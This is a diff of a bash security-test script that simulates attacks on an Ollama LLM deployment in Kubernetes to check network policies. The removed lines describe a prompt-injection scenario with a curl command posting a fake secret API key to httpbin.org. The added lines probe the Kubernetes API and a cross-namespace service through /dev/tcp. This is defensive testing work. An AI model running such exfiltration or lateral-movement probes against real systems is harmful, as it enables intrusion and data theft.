@@ -25,41 +25,58 @@ log_result() { echo -e "${PURPLE}[RESULT]${NC} $1"; }
 log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
 
 # =============================================================================
-# Attack 1: Data Exfiltration via Egress
+# Attack 1: Lateral Movement via Internal Services
 # =============================================================================
-# Simulates a prompt injection attack that causes the LLM to make outbound
-# HTTP requests to an attacker-controlled server
+# Simulates an attacker attempting to access internal services they shouldn't
+# be able to reach (Kubernetes API, services in other namespaces)
 # =============================================================================
 attack_egress_exfiltration() {
     echo ""
     echo "============================================================="
-    log_attack "ATTACK 1: Data Exfiltration via Egress HTTP"
+    log_attack "ATTACK 1: Lateral Movement to Internal Services"
     echo "============================================================="
     echo ""
-    log_info "Scenario: An attacker crafts a prompt that tricks the LLM into"
-    log_info "making HTTP requests to exfiltrate conversation data."
-    echo ""
-    log_info "Simulating outbound HTTP request from Ollama pod..."
+    log_info "Scenario: An attacker with code execution attempts to access"
+    log_info "internal cluster services for lateral movement or data exfiltration."
     echo ""
 
     OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
-    
+
     if [ -z "$OLLAMA_POD" ]; then
         log_result "Ollama pod not found. Deploy the LLM stack first."
         return 1
     fi
 
-    # Try to make an outbound HTTP request
-    echo "Command: curl -s --connect-timeout 5 http://httpbin.org/post -d 'exfiltrated_data=secret_api_key'"
+    # Attack 1a: Try to access Kubernetes API (privilege escalation vector)
+    log_info "1a: Attempting to access Kubernetes API server..."
     echo ""
-    
-    if kubectl -n llm-system exec "$OLLAMA_POD" -- curl -s --connect-timeout 5 http://httpbin.org/post -d "exfiltrated_data=secret_api_key" 2>/dev/null; then
-        echo ""
-        log_result "⚠️  VULNERABLE: Outbound HTTP request SUCCEEDED"
-        log_result "Data could be exfiltrated to attacker-controlled servers!"
+    echo "Command: Connect to kubernetes.default.svc:443"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/kubernetes.default.svc/443" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
+        echo "Connection established"
+        log_result "⚠️  VULNERABLE: Kubernetes API access SUCCEEDED"
+        log_result "Attacker could query API for secrets, escalate privileges!"
     else
         echo ""
-        log_result "✅ BLOCKED: Outbound HTTP request was blocked by network policy"
+        log_result "✅ BLOCKED: Kubernetes API access was blocked by network policy"
+    fi
+
+    echo ""
+
+    # Attack 1b: Try to access OpenWebUI in another namespace (cross-namespace lateral movement)
+    log_info "1b: Attempting cross-namespace access to OpenWebUI (llm-frontend)..."
+    echo ""
+    echo "Command: Connect to openwebui.llm-frontend.svc:8080"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/openwebui.llm-frontend.svc.cluster.local/8080" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
+        echo "Connection established"
+        log_result "⚠️  VULNERABLE: Cross-namespace access SUCCEEDED"
+        log_result "Attacker could pivot to frontend services!"
+    else
+        echo ""
+        log_result "✅ BLOCKED: Cross-namespace access was blocked by network policy"
     fi
 }
 
